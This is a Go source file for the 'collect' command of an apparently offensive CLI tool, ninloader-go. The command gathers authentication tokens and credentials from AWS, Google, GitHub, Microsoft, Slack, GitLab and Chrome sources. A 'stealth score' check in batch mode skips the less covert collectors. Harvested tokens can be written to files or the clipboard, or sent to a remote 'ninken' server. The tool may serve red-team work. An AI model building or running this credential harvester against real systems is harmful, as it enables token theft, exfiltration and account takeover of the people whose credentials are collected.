package cmd

import (
	"fmt"
	"os"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/output"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
	"github.com/spf13/cobra"
)

var collectCmd = &cobra.Command{
	Use:   "collect",
	Short: "Collect tokens from sources",
	Run: func(cmd *cobra.Command, args []string) {
		printBanner()

		service, _ := cmd.Flags().GetString("service")
		source, _ := cmd.Flags().GetString("source")
		outputType, _ := cmd.Flags().GetString("output")
		path, _ := cmd.Flags().GetString("path")
		ninkenURL, _ := cmd.Flags().GetString("ninken-url")
		account, _ := cmd.Flags().GetString("account")
		tenant, _ := cmd.Flags().GetString("tenant")
		client, _ := cmd.Flags().GetString("client")
		scopes, _ := cmd.Flags().GetString("scopes")
		clientSecret, _ := cmd.Flags().GetString("client-secret")

		opts := collector.CollectOptions{
			Account:      account,
			TenantID:     tenant,
			ClientName:   client,
			Scopes:       scopes,
			ClientSecret: clientSecret,
		}

		var results []*types.CollectedToken

		if service != "" && source != "" {
			// Specific collector
			c := registry.Get(service, source)
			if c == nil {
				fmt.Fprintf(os.Stderr, "Error: No collector found for %s/%s\n", service, source)
				os.Exit(1)
			}
			if !c.IsPlatformSupported() {
				fmt.Fprintf(os.Stderr, "Error: %s/%s not supported on this platform\n", service, source)
				os.Exit(1)
			}
			if cc, ok := c.(collector.ConfigurableCollector); ok {
				cc.Configure(opts)
			}
			results = c.Collect()

		} else if service != "" {
			// All sources for a service
			collectors := registry.AllForService(service)
			for _, c := range collectors {
				if !c.IsPlatformSupported() {
					continue
				}
				if cc, ok := c.(collector.ConfigurableCollector); ok {
					cc.Configure(opts)
				}
				tokens := safeCollect(c)
				results = append(results, tokens...)
			}

		} else {
			// All services, all sources — batch mode
			collectors := registry.All()
			for _, c := range collectors {
				if !c.IsPlatformSupported() {
					continue
				}
				// Skip interactive collectors in batch mode
				if c.StealthScore() < 4 {
					continue
				}
				tokens := safeCollect(c)
				results = append(results, tokens...)
			}
		}

		// Output
		handler, err := output.GetHandler(outputType, path, ninkenURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %s\n", err)
			os.Exit(1)
		}

		if err := handler.Write(results); err != nil {
			fmt.Fprintf(os.Stderr, "Error writing output: %s\n", err)
			os.Exit(1)
		}

		if !quiet {
			fmt.Fprintf(os.Stderr, "\nCollected %d token(s).\n", len(results))
		}
	},
}

func safeCollect(c collector.Collector) (results []*types.CollectedToken) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[WARN] [%s/%s] panic: %v\n", c.Service(), c.Source(), r)
		}
	}()
	return c.Collect()
}

func init() {
	collectCmd.Flags().String("service", "", "Service to collect from (aws, google, github, microsoft, slack, gitlab, chrome)")
	collectCmd.Flags().String("source", "", "Specific source (env, credentials, gh_cli, etc.)")
	collectCmd.Flags().String("output", "stdout", "Output destination (stdout, file, clipboard, ninken)")
	collectCmd.Flags().String("path", "", "Output directory for file output (default: ./tokens)")
	collectCmd.Flags().String("account", "", "Account hint for interactive collectors")
	collectCmd.Flags().String("tenant", "", "Tenant ID for Microsoft collectors")
	collectCmd.Flags().String("client", "", "Client ID or FOCI client name")
	collectCmd.Flags().String("scopes", "", "Comma-separated scopes for interactive collectors")
	collectCmd.Flags().String("client-secret", "", "Client secret for OAuth flows")
	collectCmd.Flags().String("ninken-url", "", "Ninken server URL for ninken output")
	rootCmd.AddCommand(collectCmd)
}
